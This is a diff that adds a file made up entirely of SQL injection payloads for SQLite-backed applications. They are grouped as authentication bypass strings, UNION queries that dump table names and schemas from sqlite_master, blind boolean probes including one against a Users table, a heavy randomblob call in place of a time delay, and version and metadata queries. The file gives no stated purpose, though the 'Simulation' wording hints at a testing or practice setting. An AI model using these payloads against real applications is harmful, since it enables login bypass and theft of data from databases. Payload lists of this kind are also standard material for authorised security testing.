@@ -1,0 +1,28 @@
+-- Basic Authentication Bypass
+' OR 1=1--
+' OR 'a'='a--
+admin' --
+
+-- Union-based Injection
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT 'test',sqlite_version()--
+' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
+
+-- Extract Tables and Columns
+' UNION SELECT name, type FROM sqlite_master--
+' AND (SELECT COUNT(*) FROM sqlite_master) > 0--
+' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'--
+
+-- Blind Injection Examples
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='a'--
+' AND SUBSTR((SELECT sql FROM sqlite_master WHERE name='Users'),1,1)='C'--
+
+-- Time-based Injection Simulation (SQLite has no SLEEP, use heavy function)
+' AND randomblob(1000000000)--
+
+-- Version & Metadata
+' UNION SELECT sqlite_version(),null--
+' UNION SELECT sqlite_compileoption_used(1),null--
